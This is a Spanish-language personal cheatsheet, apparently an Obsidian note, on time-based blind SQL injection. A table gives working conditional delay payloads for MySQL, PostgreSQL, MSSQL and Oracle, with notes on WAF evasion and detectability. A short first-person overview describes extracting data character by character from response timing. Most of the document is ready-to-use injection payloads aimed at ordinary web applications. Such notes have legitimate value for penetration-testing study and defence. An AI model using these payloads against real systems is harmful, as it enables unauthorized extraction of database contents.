---
aliases:
tags:
  - type/cheatsheet
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[SQL Injection (SQLi)]]"
---
# SQLI - Time based

***

## Cheatsheet

|**SGBD**|**Función de Retardo**|**Payload Estructural (Inferencia Condicional)**|**Lógica de Ejecución**|**Consideraciones de Red / WAF**|
|---|---|---|---|---|
|[[MySQL]]|`SLEEP()`|`AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=115, SLEEP(5), 0)`|Evalúa la condición; si es verdadera, fuerza al hilo de ejecución a pausarse por 5 segundos.|Vector estándar. Fácilmente detectable por herramientas de monitoreo de rendimiento.|
|[[MySQL]]|`BENCHMARK()`|`AND IF(1=1, BENCHMARK(5000000, MD5('test')), 0)`|Fuerza una carga de procesamiento matemático pesado repetitivo en lugar de usar una pausa nativa.|Útil si la función `SLEEP()` está deshabilitada o filtrada. Causa picos de CPU en el servidor.|
|[[PostgreSQL]]|`pg_sleep()`|`AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)`|Utiliza la estructura `CASE WHEN` para ramificar la ejecución del retraso de tiempo de forma segura.|Requiere que las consultas inyectadas manejen estrictamente los tipos de datos en los bloques `CASE`.|
|[[MSSQL]]|`WAITFOR DELAY`|`IF (ASCII(SUBSTRING((SELECT @@version),1,1))=115) WAITFOR DELAY '0:0:5'`|Detiene la ejecución del bloque actual, lote o procedimiento almacenado hasta que pase el tiempo.|Sintaxis estricta que no puede usarse directamente dentro de una sentencia `SELECT` simple; a menudo requiere apilamiento de consultas (stacked queries).|
|[[Oracle]]|`DBMS_PIPE`|`AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END FROM dual)`|Abusa de la recepción de mensajes de tubería, esperando hasta que el timeout expire.|Evita el uso de `dbms_lock.sleep`, el cual generalmente requiere privilegios de DBA para ser ejecutado.|

## Overview

El [[Time-based Blind SQLi]] es el vector inferencial de último recurso. Lo aplico en escenarios de ceguera absoluta, donde la aplicación no refleja resultados en el frontend ni altera su comportamiento, tamaño o código HTTP ante consultas lógicas verdaderas o falsas.

La metodología consiste en inyectar operaciones de retraso temporal condicionadas. Si la subconsulta evalúa a verdadero (`TRUE`), el motor de base de datos pausa la ejecución durante `n` segundos antes de responder. Al medir la latencia de la respuesta HTTP, puedo inferir de manera determinista la validez de mi consulta y extraer información carácter por carácter, aunque este canal es extremadamente lento y susceptible a falsos positivos por la inestabilidad inherente de la red.


***
